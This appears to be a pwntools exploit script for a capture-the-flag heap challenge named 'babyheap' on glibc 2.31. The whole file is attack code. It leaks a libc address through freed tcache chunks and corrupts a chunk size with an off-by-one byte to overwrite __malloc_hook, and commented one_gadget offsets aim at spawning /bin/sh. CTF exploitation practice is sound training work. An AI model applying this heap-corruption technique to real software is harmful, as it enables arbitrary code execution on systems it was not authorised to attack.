from pwn import *


def malloc(size,content):
    p.sendlineafter("Command:\n> ",b"M")
    p.sendlineafter("Size:\n> ",str(size) if size != -1 else str(len(content)))
    p.sendlineafter("Content:\n> ",content)
def free(idx):
    p.sendlineafter("Command:\n> ",b"F")
    p.sendlineafter("\n> ",str(idx))
def show(idx):
    p.sendlineafter("Command:\n> ",b"S")
    p.sendlineafter("\n> ",str(idx))
    return p.recvline()


elf = context.binary = ELF("./babyheap")
env = {"LD_PRELOAD" : "./2.31-0ubuntu9.16_amd64/libc.so.6"}
p = process(env=env)
libc = elf.libc


for i in range(9):
    malloc(0xf8,str(i).encode()* 0xf8)
for i in range(9):
    free(i)

for i in range(7):
    malloc(0xf8,str(i).encode()* 0xf8)

malloc(0xf8,b"A" * 8)
LEAK = show(7)[8:8 + 6] 
LEAK = u64(LEAK + b"\x00" * (8 - len(LEAK)))
libc.address = LEAK - 0x1ecbe0
print("LIBC LEAK: ", hex(libc.address))


for i in range(1,8):
    free(i)
# for i in range(8):
    # malloc(0xf8,str(i).encode()* 0xf8)    
malloc(0xf8,b"U" * 0xf8)
malloc(0xf8,b"@" * 0xf8)
malloc(0xf8,b"@" * 0xf8)
malloc(0xf8,b"@" * 0xf8)
malloc(0xf8,b"@" * 0xf8)
malloc(0xf8,b"@" * 0xf8)
malloc(0xf8,b"|" * 0xf8 + b"\x81")
free(0)
free(1)

print(p64(libc.sym["__malloc_hook"])[:-2])
malloc(-1,cyclic(256) + p64(libc.sym["__malloc_hook"])[:6])
malloc(0xf8,b"O" * 0x10)
gdb.attach(p)

# 0xe3afe execve("/bin/sh", r15, r12)
# 0xe3b01 execve("/bin/sh", r15, rdx)
# 0xe3b04 execve("/bin/sh", rsi, rdx)
# ONE_GADGET = libc.address + 0xe3afe
# print(p64(ONE_GADGET))
# malloc(-1,p64(ONE_GADGET)[:6])
# malloc(0x64,"K" * 0x20)
# malloc(0xf8,b"|" * 0xf8) 
# malloc(0x178,b"|" * 0xf8) 
# free(8)
# malloc(0x178,b"|" * 0x178)

p.interactive()






